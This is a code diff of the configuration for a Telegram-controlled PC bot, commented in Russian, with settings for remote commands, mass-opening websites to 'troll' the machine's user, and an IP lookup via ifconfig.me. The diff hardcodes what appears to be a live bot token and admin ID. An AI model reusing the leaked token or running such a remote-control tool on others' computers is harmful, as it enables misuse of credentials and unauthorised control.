@@ -18,9 +18,9 @@ FAST_KEYS = ["enter", "backspace", "space", "tab", "ctrl+a", "ctrl+z", "ctrl+c",
 FAST_CMDS = ['tasklist', 'ping']  # Быстрые команды (используются при вводе команд)
 TROLL_WEBSITES = ['https://dzen.ru', 'https://youtube.com', 'https://www.google.com', 'https://yandex.ru', 'https://vk.com']  # Сайты для открытия в троллинге (используются при троллинге массовым открытием сайтов)
 
-VERSION = '3.5.1'  # Версия бота
-TOKEN = ""  # Токен бота
-FIRST_ID = 123569658  # ID главного админа (обязтаельно к заполнению)
+VERSION = '3.5'  # Версия бота
+TOKEN = "5437469847:AAFTPFZtEOmrYOSDW-GWovdvJyjskdIkyAY"  # Токен бота
+FIRST_ID = 1215122907  # ID главного админа (обязтаельно к заполнению)
 SECOND_ID = 0  # ID второго админа (необязательно к заполнению). Оставьте 0, если в нем нет необходимости
 
 SAMP_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска SAMP
@@ -39,8 +39,8 @@ def make_temp_folder():
 
 
 def is_access_denied(id: int):
-    if (FIRST_ID and SECOND_ID) != id: return False
-    return True
+    return id != FIRST_ID and id != SECOND_ID
+
 
 #//////////////////////////////////////////////////////////
 conn = HTTPConnection("ifconfig.me")
